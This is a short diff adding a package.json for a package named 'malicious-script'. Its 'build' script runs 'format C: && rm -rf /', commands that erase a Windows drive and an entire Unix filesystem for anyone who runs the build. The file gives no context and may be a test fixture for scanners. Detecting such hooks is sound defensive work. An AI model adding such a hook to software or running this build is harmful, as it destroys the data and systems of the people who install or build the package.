@@ -1,0 +1,7 @@
+{
+  "name": "malicious-script",
+  "version": "1.0.0",
+  "scripts": {
+    "build": "format C: && rm -rf /"
+  }
+}
